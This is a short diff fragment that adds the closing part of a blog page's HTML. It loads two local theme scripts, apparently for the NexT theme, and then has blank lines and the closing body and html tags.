+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
